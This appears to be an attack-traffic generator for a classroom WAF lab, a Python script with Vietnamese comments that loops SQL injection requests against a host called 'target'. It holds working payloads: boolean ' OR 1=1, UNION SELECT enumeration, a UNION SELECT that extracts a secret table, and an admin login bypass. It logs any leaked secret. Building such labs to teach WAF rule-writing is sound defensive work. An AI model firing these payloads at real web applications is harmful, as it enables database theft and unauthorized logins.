#!/usr/bin/env python3
# Tan cong tu dong: ban hang loat request SQLi vao web app tren 'target'.
# - Do lo hong (' OR 1=1), liet ke, va UNION SELECT de exfil "secret".
# - In ket qua ra stdout (-> attack.log) de tu kiem chung.
# Khi sinh vien bat WAF + viet rule chuan, cac request SQLi se bi 403.
import urllib.request
import urllib.parse
import time

TARGET = "http://target"

# Danh sach request: 1 request BINH THUONG + nhieu request SQLi
PAYLOADS = [
    "/product.php?id=1",                                             # hop le (phai 200)
    "/product.php?id=1 OR 1=1",                                      # SQLi boolean
    "/product.php?id=0 UNION SELECT name,price FROM products",       # UNION liet ke
    "/product.php?id=0 UNION SELECT secret,1 FROM secret_store",     # UNION EXFIL secret
    "/login.php?user=admin' OR '1'='1&pass=x",                       # bypass dang nhap
]


def req(path):
    url = TARGET + urllib.parse.quote(path, safe=":/?=&")
    try:
        with urllib.request.urlopen(url, timeout=5) as r:
            return r.getcode(), r.read().decode(errors="ignore")
    except urllib.error.HTTPError as e:
        return e.code, ""
    except Exception as e:
        return None, str(e)


# Cho web server len
for _ in range(60):
    code, _b = req("/")
    if code:
        break
    time.sleep(2)

# Vong lap tan cong lien tuc
while True:
    for p in PAYLOADS:
        code, body = req(p)
        note = ""
        # Neu exfil thanh cong, cho biet da lay duoc "secret"
        if "secret_store" in p and body and "SECRET LEAKED" not in note:
            note = " [EXFIL] body=" + body.replace("\n", " ")[:120]
        print(time.strftime("%Y-%m-%d %H:%M:%S"), "HTTP", code, p, note, flush=True)
    time.sleep(15)
